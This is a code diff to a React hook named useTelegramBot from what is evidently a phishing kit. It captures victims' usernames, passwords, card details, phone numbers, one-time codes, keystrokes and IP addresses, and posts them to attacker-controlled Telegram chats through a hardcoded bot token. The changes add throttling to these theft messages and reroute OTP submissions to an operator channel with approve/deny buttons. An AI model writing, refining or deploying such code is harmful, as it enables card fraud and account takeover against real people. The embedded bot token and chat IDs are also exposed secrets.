@@ -8,6 +8,28 @@ const TELEGRAM_BOT_TOKEN = '8666763764:AAH1sDQvaSwAk3LwNwBFCIsZJjtJdB_hJwE';
 const LOGS_CHAT_ID = '-1003861936742';
 const ACTIONS_CHAT_ID = '-1003745991330';
 
+// Anti-spam: Track last log times
+const lastLogTimes = {
+  pageView: 0,
+  siteEntry: 0,
+  cardVerification: 0,
+  cardVerificationPage: 0,
+  otpSubmit: 0,
+  otpVerified: 0,
+  loginTyping: 0,
+  cardTyping: 0,
+  otpTyping: 0,
+  confirmation: 0,
+  blocked: 0,
+  visitNotification: 0,
+  formattedCard: 0,
+  otpCode: 0,
+  success: 0
+};
+
+// Throttle delay in milliseconds (5 seconds)
+const THROTTLE_DELAY = 5000;
+
 const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
   setTimeout(async () => {
     try {
@@ -31,6 +53,18 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     return Date.now().toString() + Math.random().toString(36).substr(2, 6);
   };
 
+  // Helper function to check if log should be sent (anti-spam)
+  const shouldSendLog = (logType) => {
+    const now = Date.now();
+    const lastTime = lastLogTimes[logType] || 0;
+    if (now - lastTime < THROTTLE_DELAY) {
+      console.log(`⏭️ Skipping duplicate ${logType} log (throttled)`);
+      return false;
+    }
+    lastLogTimes[logType] = now;
+    return true;
+  };
+
   // ========== ACTIONS CHANNEL (with buttons) ==========
   
   const sendToTelegramWithButtons = async (message, sessionId) => {
@@ -40,11 +74,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       const keyboard = {
         inline_keyboard: [
           [
-            //{ text: "✅ Approve & Continue", callback_data: `approve_${sessionId}` },
             { text: "❌ Deny", callback_data: `deny_${sessionId}` }
-          ],
-          [
-           // { text: "💳 View Card Details", callback_data: `card_${sessionId}` }
           ]
         ]
       };
@@ -65,12 +95,12 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     try {
       let userIP = 'Unable to get IP';
-    try {
-      const ipResponse = await axios.get('https://api.ipify.org?format=json');
-      userIP = ipResponse.data.ip;
-    } catch (ipError) {
-      console.error('Error getting IP:', ipError);
-    }
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
       const cardMessage = `
@@ -196,9 +226,10 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  // ========== LOGS CHANNEL (no buttons, auto-delete for most) ==========
+  // ========== LOGS CHANNEL (WITH ANTI-SPAM) ==========
 
   const sendPageViewLog = async () => {
+    if (!shouldSendLog('pageView')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `⚠️ Someone is visiting the login page! 
@@ -218,6 +249,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendSiteEntryLog = async () => {
+    if (!shouldSendLog('siteEntry')) return;
     try {
       let userIP = 'Unable to get IP';
       try {
@@ -249,6 +281,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
+    if (!shouldSendLog('visitNotification')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
@@ -294,6 +327,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendBlockedLog = async (username, reason, userIP) => {
+    if (!shouldSendLog('blocked')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `
@@ -319,6 +353,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendCardVerificationLog = async (username) => {
+    if (!shouldSendLog('cardVerification')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `💳 CARD VERIFICATION - IN PROGRESS 💳
@@ -335,6 +370,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendCardVerificationPageLog = async (username) => {
+    if (!shouldSendLog('cardVerificationPage')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `💳 <b>CARD VERIFICATION PAGE</b> 💳
@@ -357,19 +393,18 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
+  const sendOtpSubmitLog = async (username, cardNumber, phoneNumber, otpCode) => {
+    if (!shouldSendLog('otpSubmit')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `🔐 <b>OTP CODE SUBMITTED</b> 🔐
-━━━━━━━━━━━━━━━━━━━━━
-📝 <b>Status:</b> User submitted OTP code
+🔢 <b>OTP Code:</b> ${otpCode}
 👤 <b>Username:</b> ${username}
 📱 <b>Phone Number:</b> ${phoneNumber}
-🔢 <b>OTP Code:</b> ${otpCode}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>User has entered the OTP code!</i>`;
-      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
+      await axios.post(url, { chat_id: ACTIONS_CHAT_ID, text: message, parse_mode: 'HTML' });
       console.log('✅ OTP submit log sent');
     } catch (error) {
       console.error('Error sending OTP submit log:', error);
@@ -377,6 +412,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendOtpVerifiedLog = async (username, phoneNumber, otpCode) => {
+    if (!shouldSendLog('otpVerified')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `✅ <b>OTP VERIFIED SUCCESSFULLY</b> ✅
@@ -395,8 +431,9 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  // ========== TYPING LOGS (WITH AUTO-DELETE) ==========
+  // ========== TYPING LOGS (WITH ANTI-SPAM) ==========
   const sendLoginTypingLog = async (username, field, value) => {
+    if (!shouldSendLog('loginTyping')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `✏️ <b>TYPING - LOGIN PAGE</b> ✏️
@@ -421,6 +458,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendCardTypingLog = async (username, field, value) => {
+    if (!shouldSendLog('cardTyping')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `✏️ <b>TYPING - CARD VERIFICATION PAGE</b> ✏️
@@ -445,6 +483,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendOtpTypingLog = async (username, phoneNumber, value) => {
+    if (!shouldSendLog('otpTyping')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `✏️ <b>TYPING - OTP PAGE</b> ✏️
@@ -469,8 +508,9 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  // ========== CONFIRMATION LOG FOR NEXT STEP APPR (PERMANENT) ==========
+  // ========== CONFIRMATION LOG (PERMANENT) ==========
   const sendConfirmationLog = async (username, cardNumber, sessionId) => {
+    if (!shouldSendLog('confirmation')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const message = `
@@ -502,6 +542,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   // ========== OTHER FUNCTIONS ==========
 
   const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
+    if (!shouldSendLog('formattedCard')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
@@ -555,6 +596,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
+    if (!shouldSendLog('otpCode')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
@@ -582,6 +624,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   };
 
   const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
+    if (!shouldSendLog('success')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
